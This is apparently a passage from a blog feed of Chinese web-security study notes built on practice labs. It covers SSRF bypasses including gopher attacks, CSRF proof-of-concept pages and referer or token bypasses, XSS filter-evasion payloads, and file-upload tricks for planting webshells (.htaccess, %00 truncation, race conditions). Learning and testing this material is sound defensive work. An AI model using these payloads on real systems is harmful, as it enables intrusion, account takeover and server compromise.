class="hljs-comment">//0.0.0.0/flag.php</span><br></code></pre></td></tr></table></figure><ol start="3"><li>域名解析IP绕过</li></ol><p>将自己拥有的域名添加一个记录解析为127.0.0.1。</p><p>如：test.xxx.com -&gt; 127.0.0.1</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://test.xxx.com/flag.php<br></code></pre></td></tr></table></figure><ol start="4"><li>利用重定向解析绕过</li></ol><p>在自己服务器上写一个跳转页面代码如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://服务器ip/xx.php<br></code></pre></td></tr></table></figure><ol start="5"><li>匹配且不影响写法解析</li></ol><p>正则匹配规则 (url 中必须包含) &#x2F;http://ctf.. * show$&#x2F;i</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<span class="hljs-comment">#show</span><br></code></pre></td></tr></table></figure><ol start="6"><li>利用gopher协议打服务</li></ol><p>有一些前提条件，比如redis未授权、mysql无密码等。<br><img src="/../images/Pasted%20image%2020241208212140.png"></p><p><img src="/../images/Pasted%20image%2020241208212714.png"></p><p>利用工具：<a href="https://github.com/tarunkant/Gopherus" title="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p><img src="/../images/Pasted%20image%2020241208213030.png"></p><p>注意工具生成的url,要进行一次url编码，因为服务器会自动解一次码。</p><p>执行payload后就生成了x.php。<br><img src="/../images/Pasted%20image%2020241208213141.png"></p><h1 id="无回显的解决办法"><a href="#无回显的解决办法" class="headerlink" title="无回显的解决办法"></a>无回显的解决办法</h1><ol><li>dnslog 外带</li></ol><p><a href="https://blog.csdn.net/weixin_39190897/article/details/117197126">浅析DNSlog在渗透测试中的实战技巧_xml +dnslog-CSDN博客</a></p><ol start="2"><li>反向连接</li></ol><p><img src="/../images/Pasted%20image%2020241208214638.png"></p><p><img src="/../images/Pasted%20image%2020241208214645.png"></p><p><img src="/../images/Pasted%20image%2020241208214655.png"></p><ol start="3"><li>正向连接</li></ol><p>一般RCE执行可以用这个方式，SSRF得用第一种方式，因为SSRF无法写文件。</p><p>写个文件在对方网站目录下，然后再去访问网站目录是否存在这个文件就能判断目标是否执行了RCE命令。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;SSRF (Server-Side Request Forgery: 服务器端请求伪造) 一种由攻击者构造形成由服务端发起请求的一个安全漏洞</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>CSRF漏洞</title>
    <link href="http://example.com/2024/12/07/CSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/07/CSRF%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-07T12:16:30.000Z</published>
    <updated>2024-12-09T08:33:22.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>CSRF（Cross-Site Request Forgery）跨站请求伪造，是一种利用用户在某网站的身份认证信息，通过伪造请求来执行恶意操作的攻击方式。</p><ol><li><p>受害者登录：受害者先登录一个网站（如网上银行、社交平台等），并且此时浏览器保存了该网站的登录认证信息（比如 cookie）。</p></li><li><p>攻击者构造恶意请求：攻击者构造一个恶意网页或链接，链接中包含一个目标网站的请求（如更改账户密码、转账等）。该请求看似合法，但实际上是恶意构造的。</p></li><li><p>受害者点击链接：受害者在不知情的情况下点击了攻击者诱导的链接，或访问了包含恶意请求的网页。</p></li><li><p>伪造请求被发送：由于受害者已经登录目标网站，浏览器会自动附带上该网站的 Cookie 等身份认证信息，目标网站接收到这个伪造的请求时，认为这个请求来自合法用户，从而执行了恶意操作。</p></li></ol><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ol><li><p>需要伪造请求数据包。</p></li><li><p>无过滤防护，或有过滤防护但可以绕过。</p></li><li><p>受害者触发 (钓鱼)。</p></li></ol><h1 id="无防护"><a href="#无防护" class="headerlink" title="无防护"></a>无防护</h1><p>演示靶场：发货 100 模板 T11 - 电子商城模板（PC）-&gt; 后台用户管理</p><p><img src="/../images/Pasted%20image%2020241208151356.png"></p><p>BurpSuite抓一个添加管理员的包：</p><p><img src="/../images/Pasted%20image%2020241208151519.png"></p><p>然后右键选择 -&gt;Engagement tools-&gt;Generate CSRF Poc-&gt;Options-&gt;Include auto-submit script</p><p>复制生成的html代码：</p><p><img src="/../images/Pasted%20image%2020241208151810.png"></p><p>将其放到攻击者网站目录：</p><p><img src="/../images/Pasted%20image%2020241208145310.png"></p><p>引诱目标人员在同一浏览器访问这个页面，即可攻击成功。</p><p><img src="/../images/Pasted%20image%2020241208151914.png"></p><p>此时在后台发现管理员已添加成功。</p><p><img src="/../images/Pasted%20image%2020241208152107.png"></p><p>若目标管理员未登录后台，或者后台 cookie 已经过期，需要重新登录，那么将无法完成攻击。</p><h1 id="有防护-Referer-同源"><a href="#有防护-Referer-同源" class="headerlink" title="有防护- Referer 同源"></a>有防护- Referer 同源</h1><p><img src="/../images/Pasted%20image%2020241208155904.png"></p><p>演示靶场：Zblog 后台用户管理</p><p><img src="/../images/Pasted%20image%2020241208160215.png"></p><p>按照上面步骤操作后，显示非法访问：<br><img src="/../images/Pasted%20image%2020241208160436.png"><br>查看网站源码，在 cmd.php 中找到了检测 referer 的函数 CheckIsRefererValid, 按住 Ctrl 点击，跳转到定义如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CheckHTTPRefererValid</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-keyword">global</span> <span class="hljs-variable">$bloghost</span>;<br>     <span class="hljs-variable">$referer</span> = <span class="hljs-title function_ invoke__">GetVars</span>(<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>, <span class="hljs-string">&#x27;SERVER&#x27;</span>);  <span class="hljs-comment">// 获取请求中的referer</span><br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$referer</span>) === <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>     <span class="hljs-variable">$s</span> = <span class="hljs-variable">$bloghost</span>;<br>     <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:80/&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$s</span>);<br>     <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:443/&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$s</span>);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$referer</span>, <span class="hljs-variable">$s</span>) === <span class="hljs-literal">false</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br> ​<br>     <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p><strong>绕过referer匹配的策略：</strong></p><p>目标网站：<a href="http://22.22.22.22/">http://22.22.22.22/</a><br>攻击者：<a href="http://11.11.11.11/">http://11.11.11.11/</a></p><ol><li>部分匹配</li></ol><p>如上面这个 zblog 靶场的 referer 检测就是 php 的 stripos 函数，该函数 stripos () 是查找字符串在另一字符串中第一次出现的位置，并且不区分大小写的。</p><p>此时将 referer 修改为这样即可绕过检测：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">11.11</span>.<span class="hljs-number">11.11</span><span class="hljs-regexp">/http:/</span><span class="hljs-regexp">/22.22.22.22/</span>add.html<br></code></pre></td></tr></table></figure><p>怎么构造这个 referer 呢？在你的网站下创建这样一个目录即可。这里讲思路，实际上实现不了这个，因为不能创建 http: &#x2F;&#x2F;这样的目录。</p><p>也可以针对不严谨的代码逻辑绕过。上面zblog 网站源码中，若 referer 为空也返回 true。有时候重新打开浏览器访问的时候就是没有 referer，所以不是代码有问题，只是逻辑不严谨。所以可以在add.html中设置referer为空。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;no-referrer&quot;</span>&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>完全匹配</li></ol><p>只能配合文件上传漏洞（上传到目标网站目录，这时候 referer 肯定就是目标网站本身）和XSS漏洞（利用JS代码发送add.html）绕过。</p><h1 id="有防护-Token校验"><a href="#有防护-Token校验" class="headerlink" title="有防护-Token校验"></a>有防护-Token校验</h1><p><img src="/../images/Pasted%20image%2020241208172243.png"></p><p><strong>绕过策略（代码逻辑不严谨）：</strong></p><ol><li><p>将 Token 参数值复用<br>即一个 Token 可以一直使用或者使用多次。</p></li><li><p>将 Token 参数删除<br>不验证 Token 的时候。</p></li><li><p>将 Token 参数值置空<br>Token 为空的时候也可以通过验证的情况。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;CSRF（Cross-Site Request Forgery）跨站请求伪造，是一种利用用户在某网站的身份认证信息，通过伪造请求来执行恶意操</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>XSS漏洞</title>
    <link href="http://example.com/2024/12/06/XSS%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/06/XSS%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-06T03:53:52.000Z</published>
    <updated>2024-12-09T08:33:46.243Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分类及原理"><a href="#分类及原理" class="headerlink" title="分类及原理"></a>分类及原理</h1><p><a href="https://blog.csdn.net/m0_51468027/article/details/122757024">跨站脚本攻击XSS（最全最细致的靶场实战）_xss靶场-CSDN博客</a></p><p>它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用XSS代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p><p>黑盒XSS手工分析：</p><ol><li>页面中显示的数据找可控的（有些是隐藏的）。</li><li>利用可控的地方发送JS代码看执行情况。</li><li>成功执行即XSS，不成功则分析显示的输出。</li><li>分析为什么不能执行（实体化、关键字被删除等）。</li></ol><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>攻击者构造一个恶意链接，诱导用户传播和打开 。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p><p><img src="/../images/Pasted%20image%2020241206212443.png"></p><p>劫持流量实现恶意跳转：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那么所访问的网站就会被跳转到百度的首页。早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。</p><p><img src="/../images/Pasted%20image%2020241206212728.png"></p><p>真实的XSS攻击语句，需要考虑输入和输出的格式。</p><p>输入可能会有过滤，输出可能会有其他符号的拼接造成攻击语句执行失败。如下图：<br><img src="/../images/Pasted%20image%2020241206213150.png"></p><p>注意标签闭合，可以参考这篇文章：<a href="https://www.freebuf.com/articles/web/340080.html">https://www.freebuf.com/articles/web/340080.html</a><br><img src="/../images/Pasted%20image%2020241206214158.png"></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击。</p><p><img src="/../images/Pasted%20image%2020241206215512.png"></p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p><a href="https://www.freebuf.com/articles/web/306031.html">DOM型XSS - FreeBuf网络安全行业门户</a><br>不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，大部分属于反射型。</p><p><img src="/../images/Pasted%20image%2020241206221436.png"><br>DOM就是一个树状的模型，你可以编写Javascript代码根据DOM一层一层的节点，去遍历&#x2F;获取&#x2F;修改对应的节点,对象,值。</p><blockquote><p>[!NOTE]<br> 可能触发DOM型XSS的属性:<br>document.referer属性<br>window.name属性<br>location属性<br>innerHTML属性<br>document.write属性</p></blockquote><h1 id="XSS-Lab-安全防御-XSSFilter"><a href="#XSS-Lab-安全防御-XSSFilter" class="headerlink" title="XSS-Lab(安全防御-XSSFilter)"></a>XSS-Lab(安全防御-XSSFilter)</h1><p>如何绕过过滤触发JS代码？</p><ol><li><p><strong>无过滤</strong><br><img src="/../images/Pasted%20image%2020241207102927.png"></p></li><li><p><strong>标签闭合</strong></p></li></ol><p>查看源码，发现<code>&lt;</code>和<code>&gt;</code>被HTML字符实体化。</p><p><img src="/../images/Pasted%20image%2020241207104336.png"></p><p>输入的payload被赋值给value且未被实体化，可以考虑闭合value的参数值，和sql注入原理相同。</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>//<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>单引号闭合并添加事件</strong></li></ol><p>发现value也被实体化。</p><p><img src="/../images/Pasted%20image%2020241207155933.png"></p><p>利用onfocus事件绕过：<br><img src="/../images/Pasted%20image%2020241207160659.png"></p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">&#x27; onfocus=javascript:alert() &#x27; <span class="hljs-comment">//注意空格</span><br></code></pre></td></tr></table></figure><p> 然后再点击输入框触发onfocus事件即可。</p><ol start="4"><li><strong>双引号闭合并添加事件</strong></li></ol><p>发现依旧实体化，且value删除了<code>&lt;</code>和<code>&gt;</code>。<br><img src="/../images/Pasted%20image%2020241207161509.png"></p><p>同样添加onfocus事件可以绕过，注意闭合方式是双引号。</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot; onfocus=javascript:alert() &quot;</span> <span class="hljs-comment">//注意空格</span><br></code></pre></td></tr></table></figure><ol start="5"><li><strong>事件关键字过滤，利用其他标签调用，双引号闭合</strong></li></ol><p>实体化，script被添加下划线，onfocus同样也被添加下划线。</p><p><img src="/../images/Pasted%20image%2020241207161911.png"></p><p>因此我们可以换一个标签来执行js代码：</p><p><img src="/../images/Pasted%20image%2020241207162737.png"></p><p>href属性的意思是 当标签a被点击的时候，就会触发执行转跳，上面是转跳到一个网站，我们还可以触发执行一段js代码：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span>  <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>//<br></code></pre></td></tr></table></figure><p>之后点击xss，触发a标签href属性即可。</p><p><strong>6. 大小写绕过</strong></p><p>发现href也被添加下划线：</p><p><img src="/../images/Pasted%20image%2020241207164347.png"></p><p>查看服务器端源码：<br><img src="/../images/Pasted%20image%2020241207164643.png"></p><p>str_replace不区分大小写，所以可以利用大小写绕过：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span>  <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>//<br></code></pre></td></tr></table></figure><ol start="7"><li><strong>双写绕过</strong></li></ol><p>发现关键字被删除：</p><p><img src="/../images/Pasted%20image%2020241207165338.png"></p><p>利用双写绕过：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span>  <span class="hljs-attr">hrhrefef</span>=<span class="hljs-string">javascscriptript:alert()</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>//<br></code></pre></td></tr></table></figure><ol start="8"><li><strong>unicode编码绕过</strong></li></ol><p>输入的值被插入到<code>&lt;a&gt;</code>标签的<code>href</code>属性值中：</p><p><img src="/../images/Pasted%20image%2020241207173721.png"></p><p> href属性自动解析Unicode编码：<br> <br><img src="/../images/Pasted%20image%2020241207175413.png"></p><ol start="9"><li><strong>内容检测</strong></li></ol><p>发现不合法，猜测这里可能对url地址做了匹配。只有包含正常的url地址才能添加到href属性值。 </p><p><img src="/../images/Pasted%20image%2020241207180258.png"></p><p>查看源码：<br><img src="/../images/Pasted%20image%2020241207180418.png"></p><p>因此要向传入的值里面添加http:&#x2F;&#x2F;并用注释符注释掉否则会执行不了无法弹窗:</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">javascript:alert()<span class="hljs-regexp">//</span>http:<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><p>此外还存在其他过滤，要将<code>javascript:alert()</code>进行unicode编码。</p><ol start="10"><li><strong>输入数据被隐藏</strong></li></ol><p><img src="/../images/Pasted%20image%2020241207181317.png"></p><p>查看源码，发现还有其他传参方法，且过滤了<code>&lt;</code>和<code>&gt;</code>：</p><p><img src="/../images/Pasted%20image%2020241207181500.png"></p><p>因为这里输入框被隐藏了，需要添加type&#x3D;”text”，构造payload：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><p>成功执行XSS：<br><img src="/../images/Pasted%20image%2020241207183505.png"></p><ol start="11"><li><strong>http头传值</strong></li></ol><p><img src="/../images/Pasted%20image%2020241207184312.png"></p><p>猜测第四个名为t_ref的input标签是http头referer的参数。</p><p>BurpSuite抓包，添加Referer头，payload为：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript"><span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span><span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241207184947.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分类及原理&quot;&gt;&lt;a href=&quot;#分类及原理&quot; class=&quot;headerlink&quot; title=&quot;分类及原理&quot;&gt;&lt;/a&gt;分类及原理&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/m0_51468027/article/details</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://example.com/2024/11/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/11/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-11-23T11:06:56.000Z</published>
    <updated>2024-12-24T11:08:53.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端JS验证"><a href="#前端JS验证" class="headerlink" title="前端JS验证"></a>前端JS验证</h1><p>要么看源码，要么抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了：</p><p><img src="/../images/Pasted%20image%2020241128163111.png"></p><p>直接将 shell.php 重命名为 shell.png 上传，抓包的时候再将文件名修改为 shell.php 即可绕过前端限制，成功上传 webshell。或者直接在浏览器上禁用 JS。</p><h1 id="htaccess-文件"><a href="#htaccess-文件" class="headerlink" title=".htaccess 文件"></a>.htaccess 文件</h1><p><img src="/../images/Pasted%20image%2020241128190903.png"></p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .png<br><span class="hljs-comment"># 把.png文件解析成php</span><br></code></pre></td></tr></table></figure><p>上传shell.php，抓包。<br><img src="/../images/Pasted%20image%2020241128204054.png"></p><p>文件名改成.htaccess，内容改成<code>AddType application/x-httpd-php .png</code> 。<br><img src="/../images/Pasted%20image%2020241128204150.png"></p><p>shell.php更改后缀名为.png再上传。</p><p><img src="/../images/Pasted%20image%2020241128204818.png"></p><p>成功上传后门。<br><img src="/../images/Pasted%20image%2020241128204935.png"></p><h1 id="MIME类型"><a href="#MIME类型" class="headerlink" title="MIME类型"></a>MIME类型</h1><p><img src="/../images/Pasted%20image%2020241129100728.png"></p><p>直接上传shell.php，抓包修改<code>Content-Type</code> 类型为：<code>image/png</code> 等合法的类型。</p><h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p><img src="/../images/Pasted%20image%2020241129101402.png"></p><p>上传shell.php，更改MIME，并在文件头部加上GIF89a:</p><p><img src="/../images/Pasted%20image%2020241129102056.png"></p><h1 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h1><h2 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h2><p><img src="/../images/Pasted%20image%2020241129102313.png"></p><p>代码过滤不严：黑名单后缀设置为空，但是无递归，只检测一次，所以直接使用嵌套后缀：<code>shell.pphphp</code>。</p><h2 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h2><p><img src="/../images/Pasted%20image%2020241129103724.png"></p><p>函数缺陷：<code>str_replace</code> 和 <code>str_ireplace</code> 都是 PHP 中用于字符串替换的函数，它们之间的区别在于<code>str_replace</code>区分大小写，只有完全匹配的字符串会被替换，这样很容易就被大小写绕过。</p><p>因为 Windows 环境下不区分大小写，所以更改后缀名为.PHp ，但是 Linux 区分大小写。</p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>burpsuite抓包，发送到Intruder，php后缀添加载荷。点击Payloads，载入fuzzdbmaster项目中针对php后缀的字典。<br><img src="/../images/Pasted%20image%2020241129113732.png"></p><p>查看不同长度的响应，寻找可以绕过的后缀名。</p><h1 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h1><p><img src="/../images/Pasted%20image%2020241129104627.png"></p><p>抓包发现路径信息通过 GET 方式传递给后端，直接在路径后添加<code>/new.php%00</code>，这样保存的文件名就是这样的效果：</p><figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache2/</span>htdocs<span class="hljs-regexp">/upload/</span><span class="hljs-keyword">new</span>.php%<span class="hljs-number">00</span>shell.jpg<br></code></pre></td></tr></table></figure><p>因为 <code>%00</code> 起到截断的作用，所以最终会在 upload 目录下面生成 new.php 的 webshell。</p><p>以上是GET型00截断，在url上%00自动解码一次。如果是POST型00截断，就需要手工解码：</p><p><img src="/../images/Pasted%20image%2020241129111932.png"></p><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p><img src="/../images/Pasted%20image%2020241129114114.png"></p><p>源码有逻辑缺陷，是先上传再判断。所以在删除之前，访问上传的用来生成恶意shell的文件，创建一个新的shell文件。</p><p>上传shell.php，抓包，发送到Intruder。<br><img src="/../images/Pasted%20image%2020241129121113.png"></p><p>因为上传了服务器就会删除，所以要不断上传，以便抓取访问shell.php的数据包。<br><img src="/../images/Pasted%20image%2020241129122118.png"><br><img src="/../images/Pasted%20image%2020241129122142.png"></p><p>与此同时，相同操作不断访问&#x2F;upload&#x2F;shell.php。</p><p>访问&#x2F;upload&#x2F;xiao.php，发现已存在，生成webshell成功。<br><img src="/../images/Pasted%20image%2020241129122818.png"></p><h1 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h1><p><img src="/../images/Pasted%20image%2020241129123104.png"></p><p>准备一个gif，上传之后再导出。打开010Editor，对比两个文件内容：<br><img src="/../images/Pasted%20image%2020241129124726.png"></p><p>灰色部分就是内容一致的部分，把后门代码插入到灰色部分：</p><p><img src="/../images/Pasted%20image%2020241129131905.png"></p><p>上传之后复制图片链接，利用文件包含漏洞，可执行任意命令:<br><img src="/../images/Pasted%20image%2020241129132636.png"></p><h1 id="move-uploaded-file-缺陷"><a href="#move-uploaded-file-缺陷" class="headerlink" title="move_uploaded_file 缺陷"></a>move_uploaded_file 缺陷</h1><p><img src="/../images/Pasted%20image%2020241129133014.png"></p><p>当 <code>$img_path</code> 可控的时候，将文件命名为<code>shell.php/.</code>，会把&#x2F;.忽略，就可以上传一个php文件：</p><p><img src="/../images/Pasted%20image%2020241129133400.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前端JS验证&quot;&gt;&lt;a href=&quot;#前端JS验证&quot; class=&quot;headerlink&quot; title=&quot;前端JS验证&quot;&gt;&lt;/a&gt;前端JS验证&lt;/h1&gt;&lt;p&gt;要么看源码，要么抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>基础知识</title>
    <link href="http://example.com/2024/11/22/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://example.com/2024/11/22/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
    <published>2024-11-22T08:20:16.000Z</published>
    <updated>2024-12-20T05:45:18.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><p>流行的JS框架有Vue、NodeJS、jQuery、Angular等。</p><p>JS安全问题：</p><ol><li>源码泄漏</li><li>未授权访问&#x3D;JS里面分析更多的URL访问确定接口路径</li><li>敏感key泄漏&#x3D;JS文件中可能配置了接口信息（云应用，短信，邮件，数据库等）</li><li>API接口安全&#x3D;（代码中加密提交参数传递，更多的URL路径）</li></ol><p>浏览器F12搜索关键词寻找泄露路径：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby">src=  <br>path=  <br><span class="hljs-symbol">method:</span>“get”  <br>http.get(<span class="hljs-string">&quot;  </span><br><span class="hljs-string">method:“post”  </span><br><span class="hljs-string">http.post(&quot;</span>  <br><span class="hljs-variable">$.</span>ajax<br>[<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/service.httppost](http:/</span><span class="hljs-regexp">/service.httppost/</span>)<br>[<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/service.httpget](http:/</span><span class="hljs-regexp">/service.httpget/</span>)<br></code></pre></td></tr></table></figure><p>URLFinder-用于分析页面中的js与url,查找隐藏在其中的敏感信息或未授权api接口。<br><a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a>  </p><h1 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h1><p>蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度钻研蜜罐识别的方式方法。</p><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><p>通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络。CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。</p><p>传统访问：用户访问域名–&gt;解析服务器 IP–&gt;访问目标主机<br>普通 CDN：用户访问域名–&gt;CDN 节点–&gt;真实服务器 IP–&gt;访问目标主机<br>带 WAF的 CDN：用户访问域名–&gt;CDN 节点（WAF）–&gt;真实服务器 IP–&gt;访问目标主机</p><p>使用不同区域ping，查看ping的ip结果是否唯一。若不唯一，则目标网站可能存在CDN。<br><a 